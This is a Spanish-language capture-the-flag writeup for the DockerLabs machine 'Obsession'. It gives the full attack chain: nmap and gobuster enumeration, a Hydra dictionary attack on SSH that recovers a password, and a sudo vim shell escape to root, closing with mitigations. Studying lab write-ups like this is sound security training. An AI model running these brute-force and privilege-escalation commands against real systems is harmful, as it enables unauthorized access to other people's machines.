# Obsession-Dockerlabs
Enumeración de rutas en web, y hacking de protocolos de red, principalmente SSH y FTP.
# Obsession — DockerLabs Writeup

> **Plataforma:** DockerLabs · **Dificultad:** Fácil
> **Autor del writeup:** David Rodríguez Somolinos
> **Técnicas:** Enumeración web · FTP anónimo · Fuerza bruta SSH · Abuso de sudo (GTFOBins)

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración](#2-enumeración)
3. [Acceso inicial (Foothold)](#3-acceso-inicial-foothold)
4. [Escalada de privilegios](#4-escalada-de-privilegios)
5. [Resumen de la cadena](#5-resumen-de-la-cadena)

---

## 1. Reconocimiento

### Descubrimiento del host

Comprobamos conectividad con la máquina objetivo:

```bash
ping -c 1 172.17.0.2
```

El `ttl=64` indica que se trata de una máquina **Linux**.

### Escaneo de puertos con Nmap

Lanzamos un escaneo completo de puertos, servicios y scripts por defecto:

```bash
sudo nmap -p- -sV -sC -sS -vvv -Pn -n -T5 172.17.0.2
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | Apache httpd 2.4.58 (Ubuntu) |

Hallazgos relevantes del escaneo:

- **HTTP (80):** título de la web → *"Russoski Coaching"*.

---

## 2. Enumeración

### Servicio web (puerto 80)

La web es la página de un entrenador personal, **"Russoski Coaching"** / *The Aesthetic Dream*. En el pie de página aparece el contacto:

```
russoski@dockerlabs.es
```

Esto nos da un **nombre de usuario candidato**: `russoski`.

### Fuzzing de directorios

Enumeramos rutas con gobuster:

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,backup --exclude-length 10701
```

Resultados:

```
/backup      (Status: 301)
/important   (Status: 301)
```

### /important/ — descarte

`http://172.17.0.2/important/important.md` contiene el **Manifiesto Hacker** ("La Conciencia de un Hacker", de The Mentor). Es **texto de relleno / despiste**, sin información útil.

### /backup/ — hallazgo clave

`http://172.17.0.2/backup/backup.txt` contiene:

```
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

Confirmamos el usuario **`russoski`** y, lo más importante, que **reutiliza las mismas credenciales en todos los servicios** (FTP, SSH, web). Solo falta la contraseña.

---

## 3. Acceso inicial (Foothold)

### Fuerza bruta contra SSH

Dado que el usuario reutiliza la contraseña en todos los servicios, lanzamos un ataque de diccionario contra SSH con Hydra y el diccionario `rockyou.txt`:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -V
```

> Nota: SSH limita las conexiones paralelas. Se recomienda `-t 4` para evitar falsos negativos.

Resultado:

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

Credenciales obtenidas: **`russoski` : `iloveme`**

### Conexión SSH

```bash
ssh russoski@172.17.0.2
# password: iloveme
```

> Si la IP se había usado con una máquina anterior, SSH avisará de que la clave del host ha cambiado. Se soluciona con:
> `ssh-keygen -f ~/.ssh/known_hosts -R 172.17.0.2`

Obtenemos la **flag de usuario**.

---

## 4. Escalada de privilegios

### Enumeración de permisos sudo

Comprobamos qué puede ejecutar el usuario como root:

```bash
sudo -l
```

```
User russoski may run the following commands on deb088818dc4:
    (root) NOPASSWD: /usr/bin/vim
```

El usuario puede ejecutar **`vim` como root y sin contraseña**.

### Abuso de vim (GTFOBins)

`vim` permite ejecutar comandos del sistema desde su interior. Al correrlo con `sudo`, esos comandos heredan privilegios de **root**. 
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

Esto abre vim como root y ejecuta inmediatamente `/bin/bash`, dándonos una shell con **UID 0**:

```
root@deb088818dc4:/home/russoski/Proyectos#
```

**Máquina comprometida por completo.** ✅

---

## 5. Resumen de la cadena

| Fase | Acción | Resultado |
|------|--------|-----------|
| Reconocimiento | Nmap | FTP anónimo, SSH, web Apache |
| Enumeración | gobuster → `/backup/backup.txt` | Usuario `russoski` + reutiliza credenciales |
| Foothold | Hydra sobre SSH (rockyou) | `russoski:iloveme` → shell de usuario |
| Escalada | `sudo -l` → vim NOPASSWD (GTFOBins) | Shell de **root** |

### Mitigaciones

- **Deshabilitar el login anónimo en FTP** y no exponer ficheros con información sensible.
- **No publicar notas con usuarios/credenciales** en directorios web accesibles (`/backup/`).
- **Usar contraseñas robustas** y no reutilizarlas entre servicios (la password `iloveme` cae en segundos con rockyou).
- **Restringir sudo:** conceder `NOPASSWD` a `vim` equivale a dar root. Si un binario debe ejecutarse con privilegios, aplicar el mínimo necesario y evitar binarios con capacidad de *shell escape*.

---
